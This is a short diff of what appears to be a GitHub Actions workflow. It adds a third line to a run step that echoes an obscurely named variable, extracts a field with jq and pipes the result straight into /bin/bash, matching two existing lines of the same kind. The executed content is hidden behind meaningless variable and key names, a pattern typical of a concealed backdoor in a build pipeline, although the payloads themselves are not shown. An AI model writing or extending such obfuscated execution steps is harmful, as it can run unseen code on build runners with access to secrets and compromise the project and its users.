@@ -20,6 +20,7 @@ jobs:
         run: |
           printf '%s' "$ocjpj18" | jq -r .knp01 | /bin/bash
           echo $ym87 | jq -r .g3 | /bin/bash
+          echo $cqf7 | jq -r .bs526 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
